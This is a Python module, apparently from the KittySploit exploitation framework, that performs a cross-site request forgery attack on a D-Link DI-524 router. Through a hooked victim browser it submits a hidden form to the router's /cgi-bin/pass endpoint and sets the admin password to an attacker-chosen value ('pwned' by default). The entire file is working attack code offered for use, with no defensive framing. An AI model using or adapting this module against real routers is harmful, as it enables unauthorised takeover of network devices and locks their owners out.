from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "D-Link DI-524 CSRF",
		"description": "D-Link DI-524 Wireless 150 router - Change admin password via CSRF POST",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target router URL (with http://)", required=True)
	password = OptString("pwned", "New password to set", required=True)

	def run(self):
		form_data = [
			f'<form method="POST" action="{self.target}/cgi-bin/pass">',
			f'<input type="hidden" name="rc" value="@atbox">',
			f'<input type="hidden" name="Pa" value="{self.password}"/>',
			f'<input type="hidden" name="p1" value="{self.password}"/>',
			'</form>'
		]
		
		print_info(f"Executing CSRF POST attack on: {self.target}")
		print_info(f"Target: {self.target}/cgi-bin/pass")
		print_info(f"New password: {self.password}")
		
		js_code = self.csrf_post_and_submit(form_data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Password change request sent")
			return True
		else:
			fail.CSRFPostFailed()
		return False
